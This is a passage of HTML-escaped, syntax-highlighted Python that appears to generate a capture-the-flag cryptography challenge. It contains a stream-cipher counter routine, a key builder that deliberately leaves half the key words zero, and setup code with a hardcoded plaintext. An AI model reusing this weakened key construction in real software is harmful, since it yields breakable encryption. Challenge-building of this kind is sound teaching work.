        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;current_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4294967295&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initial_counter_int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Warning: counter for nonce &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nonce_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; wrapped around to 0 during a multi-block message.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#2 print(&quot;output_byte&quot;, hexlify(bytes(output_byte_array)))
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_byte_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;increment_byte_array_le&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Increments a little-endian byte array representing an integer by a given amount.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Input byte_arr length must be &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;little&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;max_val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_val_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;little&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_val_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_structured_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; Constructs a 32-byte key. If structured, uses 16 bytes of active material.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;key_words_int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;For patterned keys (&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pattern_a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pattern_b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;), active_material_hex must be 16 bytes (32 hex characters).&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;active_material_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;am_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_am_word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;nonlocal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;am_idx&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# inserted
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;am_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active_material_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Not enough active material for the 4 active key words.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active_material_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;am_idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;am_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;little&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;am_idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key_words_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_am_word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key_words_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_am_word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key_words_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_am_word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key_words_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_am_word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key_bytes_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_int&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key_words_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;key_bytes_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;little&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_bytes_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_challenge_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds_to_run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_size_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_target_counter_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_package_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Starting CTF challenge package generation: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_package_file&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;selected_constants&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zeros&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;secret_target_nonce_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret_target_nonce_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ValueError&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;FATAL ERROR: Invalid hex in secret_target_nonce_hex: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;construct_structured_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_key_active_material_hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;known_structured_key_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;known_structured_key_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;INFO: Known structured key for player: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;known_structured_key_hex&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;#p_common_bytes = os.urandom(message_size_bytes)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;9de16236ae1521cffe67ab68fd1325951b2a1b11b75bec946325faca2a8db02a013b9c18ddd31f168e6dd472ebccdfc7d92c85e96546e822dd7002a2691f9392&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p_common_hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_common_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;INFO: Generated P_common (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message_size_bytes&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; bytes) for learning dataset.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;learning_dataset_entries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;total_learning_samples&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_nonce_variations&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_counter_variations&lt;/span&gt;
